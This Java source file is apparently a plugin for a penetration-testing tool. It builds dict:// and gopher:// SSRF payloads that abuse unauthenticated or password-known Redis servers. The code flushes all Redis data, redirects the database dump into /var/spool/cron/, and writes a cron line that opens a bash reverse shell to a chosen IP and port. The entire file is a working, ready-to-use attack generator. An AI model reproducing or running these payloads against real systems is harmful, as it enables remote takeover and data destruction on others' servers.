package me.gv7.woodpecker.plugin.helper;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Objects;

public class Cron implements IHelper {
    @Override
    public String getHelperTabCaption() {
        return "Cron";
    }

    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        List<IArg> args = new ArrayList<>();

        // redis对应的ip
        final IArg redisip = HelperPlugin.pluginHelper.createArg();
        redisip.setName("redis-ip");
        redisip.setDefaultValue("127.0.0.1");
        redisip.setDescription("redis服务ip");
        redisip.setRequired(true);
        redisip.setType(0);
        args.add(redisip);

        // redis对应的端口
        final IArg redisport = HelperPlugin.pluginHelper.createArg();
        redisport.setName("redis-port");
        redisport.setDefaultValue("6379");
        redisport.setDescription("redis服务端口");
        redisport.setRequired(true);
        redisport.setType(0);
        args.add(redisport);

        // 反弹服务器的ip
        final IArg reverseip = HelperPlugin.pluginHelper.createArg();
        reverseip.setName("reverse-ip");
        reverseip.setDefaultValue("1.1.1.1");
        reverseip.setDescription("反弹服务器ip");
        reverseip.setRequired(true);
        reverseip.setType(0);
        args.add(reverseip);

        // 反弹服务器的端口
        final IArg reverseport = HelperPlugin.pluginHelper.createArg();
        reverseport.setName("reverse-port");
        reverseport.setDefaultValue("2333");
        reverseport.setDescription("反弹服务器端口");
        reverseport.setRequired(true);
        reverseport.setType(0);
        args.add(reverseport);

        // redis对应的密码
        final IArg auth = HelperPlugin.pluginHelper.createArg();
        auth.setName("auth");
        auth.setDefaultValue("");
        auth.setDescription("认证密码");
        auth.setRequired(true);
        auth.setType(0);
        args.add(auth);

        IArgsUsageBinder argsUsageBinder = HelperPlugin.pluginHelper.createArgsUsageBinder();
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void doHelp(Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String ip = (String) map.get("redis-ip");
        String port = (String) map.get("redis-port");
        String reverseip = (String) map.get("reverse-ip");
        String reverseport = (String) map.get("reverse-port");
        String auth = (String) map.get("auth");
        String dictPayload = "dict://"+ip+":"+port+"/";
        String payload = "\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n";
        String reversePayload = String.format(payload, reverseip, reverseport);
        String redisPayload = Utils.hexToString(reversePayload);
        if (Objects.equals(auth, "")) {
            List<String> list = new ArrayList<>();
            
            list.add(dictPayload+"flushall");
            list.add(dictPayload+"config:set:dbfilename:root");
            list.add(dictPayload+"set:ket:\""+redisPayload+"\"");
            list.add(dictPayload+"config:set:dir:/var/spool/cron/");
            list.add(dictPayload+"save");
            list.add(dictPayload+"quit");
            iResultOutput.warningPrintln("flushall会清空redis中的所有数据，请谨慎使用！");
            iResultOutput.warningPrintln("web端ssrf需要url编码两次才可以打进去");
            for (String s : list) {
                iResultOutput.rawPrintln(s);
            }
            List<String> gopher = new ArrayList<>();
            gopher.add("flushall\n");
            gopher.add("config set dbfilename root\n");
            gopher.add("config set dir /var/spool/cron/\n");
            gopher.add("set redisket \""+reversePayload.replace("'", "~~~").replace("\"", "~~~~").replace("\r", "")+"\""+"\n");
            gopher.add("save\n");
            gopher.add("quit\n");
            String encoded = GopherCodec.encode4gopher(gopher,ip,port);
            if (encoded.contains("%7E%7E%7E%7E")){
                iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E%7E","%22"));
            }else if (encoded.contains("%7E%7E%7E")) {
                iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E", "%27"));
            }else {
                iResultOutput.rawPrintln(encoded);
            }
        }else {
            List<String> list = new ArrayList<>();
            list.add(dictPayload+"auth:"+auth);
            list.add(dictPayload+"flushall");
            list.add(dictPayload+"config:set:dbfilename:root");
            list.add(dictPayload+"set:ket:\""+redisPayload+"\"");
            list.add(dictPayload+"config:set:dir:/var/spool/cron/");
            list.add(dictPayload+"save");
            list.add(dictPayload+"quit");
            iResultOutput.warningPrintln("flushall会清空redis中的所有数据，请谨慎使用！");
            iResultOutput.warningPrintln("web端ssrf需要url编码两次才可以打进去");
            for (String s : list) {
                iResultOutput.rawPrintln(s);
            }
            List<String> gopher = new ArrayList<>();
            gopher.add("auth "+auth+"\n");
            gopher.add("flushall\n");
            gopher.add("config set dbfilename root\n");
            gopher.add("config set dir /var/spool/cron/\n");
            gopher.add("set redisket \""+reversePayload.replace("'", "~~~").replace("\"", "~~~~").replace("\r", "")+"\""+"\n");
            gopher.add("save\n");
            gopher.add("quit\n");
            String encoded = GopherCodec.encode4gopher(gopher,ip,port);
            if (encoded.contains("%7E%7E%7E%7E")){
                iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E%7E","%22"));
            }else if (encoded.contains("%7E%7E%7E")) {
                iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E", "%27"));
            }else {
                iResultOutput.rawPrintln(encoded);
            }
        }
    }


}
